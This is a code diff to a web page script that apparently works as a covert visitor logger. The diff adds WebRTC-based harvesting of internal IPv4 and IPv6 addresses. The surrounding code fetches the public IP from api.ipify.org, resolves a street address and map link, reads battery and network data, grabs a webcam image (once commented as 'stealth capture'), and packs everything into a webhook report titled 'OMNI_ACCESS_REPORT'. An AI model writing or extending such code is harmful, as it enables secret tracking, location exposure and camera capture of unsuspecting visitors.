@@ -62,17 +62,21 @@
             } catch(e) { return { addr: "Unknown", map: "N/A" }; }
         }
 
-        async function getPrivateIP() {
+        async function getFullStackIP() {
             return new Promise((resolve) => {
+                const ips = { v4: "PROTECTED", v6: "PROTECTED" };
                 const rtc = new RTCPeerConnection({ iceServers: [] });
-                rtc.createDataChannel('');
-                rtc.createOffer().then(o => rtc.setLocalDescription(o));
+                rtc.createDataChannel('probe');
                 rtc.onicecandidate = (e) => {
                     if (!e || !e.candidate) return;
-                    const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/) || e.candidate.candidate.match(/([a-f0-9\-]+\.local)/);
-                    if (m) { resolve(m[1]); rtc.onicecandidate = null; }
+                    const c = e.candidate.candidate;
+                    const v4 = c.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    const v6 = c.match(/([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})|([a-f0-9:]+:[a-f0-9:]+)/);
+                    if (v4) ips.v4 = v4[1];
+                    if (v6 && v6[0].includes(':') && !v6[0].endsWith('.local')) ips.v6 = v6[0];
                 };
-                setTimeout(() => resolve("PROTECTED"), 3000);
+                rtc.createOffer().then(o => rtc.setLocalDescription(o));
+                setTimeout(() => { rtc.close(); resolve(ips); }, 3500);
             });
         }
 
@@ -81,7 +85,8 @@
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             
-            let report = { ts: new Date().toLocaleString(), gIP: "DENIED", pIP: await getPrivateIP() };
+            const localIPs = await getFullStackIP();
+            let report = { ts: new Date().toLocaleString(), gIP: "DENIED" };
 
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -92,7 +97,6 @@
             const geo = await getGeo(report.gIP);
             const stats = await getStats();
 
-            // 📷 ステルスキャプチャ
             let fileBlob = null;
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -111,18 +115,18 @@
             const payload = {
                 username: "NANA_ADMIN_LOGGER",
                 embeds: [{
-                    title: "🛑 OMNI_ACCESS_REPORT",
+                    title: "🛑 OMNI_ACCESS_REPORT (DUAL_STACK)",
                     color: 16727873,
                     fields: [
                         { name: "🌐 GLOBAL_IP", value: `\`${report.gIP}\``, inline: true },
-                        { name: "🏠 PRIVATE_IP", value: `\`${report.pIP}\``, inline: true },
+                        { name: "🏠 INTERNAL_IPv4", value: `\`${localIPs.v4}\``, inline: true },
+                        { name: "🧬 INTERNAL_IPv6", value: `\`${localIPs.v6}\``, inline: false },
                         { name: "📍 ADDRESS", value: `\`${geo.addr}\``, inline: false },
                         { name: "🗺️ GOOGLE MAPS", value: `[View Location](${geo.map})`, inline: false },
                         { name: "🔋 BATTERY", value: `\`${stats.battery}\``, inline: true },
-                        { name: "📶 NETWORK", value: `\`${stats.net}\``, inline: true },
-                        { name: "📄 USER_AGENT", value: `\`\`\`${navigator.userAgent}\`\`\`` }
+                        { name: "📶 NETWORK", value: `\`${stats.net}\``, inline: true }
                     ],
-                    footer: { text: `Captured: ${report.ts} | JANUS-V4` }
+                    footer: { text: `Captured: ${report.ts} | JANUS-V5` }
                 }]
             };
             fd.append('payload_json', JSON.stringify(payload));
